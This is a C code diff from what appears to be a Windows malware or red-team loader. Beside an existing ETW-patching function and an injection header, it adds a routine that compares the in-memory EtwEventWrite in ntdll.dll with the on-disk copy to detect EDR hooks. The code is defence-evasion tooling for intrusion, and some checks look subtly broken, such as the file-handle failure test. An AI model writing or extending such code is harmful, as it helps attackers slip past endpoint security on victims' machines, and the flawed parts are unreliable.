@@ -1,5 +1,9 @@
 #include <stdio.h>
 #include <Windows.h>
+#include "injection.h"
+#include "config.h"
+
+
 
 BOOL EtwPatch() {
 	
@@ -30,4 +34,49 @@ BOOL EtwPatch() {
 
 }
 
+BOOL EdrHookerCheck() {
+	HANDLE hNtdll = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
+		GENERIC_READ,
+		FILE_SHARE_READ, NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL, NULL);
 
+	if (hNtdll == NULL) {
+		printf("[-] Failed to open on-disk ntdll");
+		return 0;
+	}
+
+	HANDLE hMappedNtdll = CreateFileMappingW(hNtdll, NULL, PAGE_READONLY, 0, 0, NULL);
+
+	if (hMappedNtdll == NULL) {
+		printf("[-] Failed to map on-disk ntdll");
+		return 0;
+	}
+
+	PVOID pNtdll = MapViewOfFile(hMappedNtdll, FILE_MAP_READ, 0, 0, 0);
+
+	if (pNtdll == NULL) {
+		printf("[-] Failed to map view of on-disk ntdll");
+		return 0;
+	}
+
+
+	HMODULE hmy_Ntdll = GetModuleHandleW(L"ntdll.dll");
+	PVOID my_ntdll = manual_procaddress(hmy_Ntdll, "EtwEventWrite");
+	PVOID disk_ntdll = manual_procaddress((HMODULE)pNtdll, "EtwEventWrite");
+
+	if (memcmp(my_ntdll, disk_ntdll, 5) == 0) {
+		printf("[x] No EDR Hooks Detected\n");
+		CloseHandle(hNtdll);
+		CloseHandle(hMappedNtdll);
+		UnmapViewOfFile(pNtdll);
+		return 1;
+	}
+	else {
+		printf("[-] EDR HOOKS DETECTED!\n");
+		CloseHandle(hNtdll);
+		CloseHandle(hMappedNtdll);
+		UnmapViewOfFile(pNtdll);
+		return 0;
+	}
+}
